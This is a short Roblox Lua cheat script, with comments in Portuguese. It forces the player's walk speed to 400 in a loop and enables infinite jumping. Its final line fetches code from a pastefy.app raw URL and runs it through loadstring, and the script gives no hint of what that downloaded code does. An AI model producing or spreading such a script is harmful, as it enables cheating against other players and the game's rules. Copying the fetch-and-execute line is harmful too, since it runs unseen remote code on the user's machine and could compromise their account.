local Player = game:GetService("Players").LocalPlayer
local UIS = game:GetService("UserInputService")

-- Loop para garantir que a speed continue ativa
task.spawn(function()
    while true do
        if Player.Character and Player.Character:FindFirstChild("Humanoid") then
            Player.Character.Humanoid.WalkSpeed = 400
        end
        task.wait(0.1) -- Pequeno intervalo para evitar uso excessivo de recursos
    end
end)

-- Pulo infinito
UIS.JumpRequest:Connect(function()
    if Player.Character and Player.Character:FindFirstChild("Humanoid") then
        Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

loadstring(game:HttpGet("https://pastefy.app/Ocvq0Xwx/raw"))()
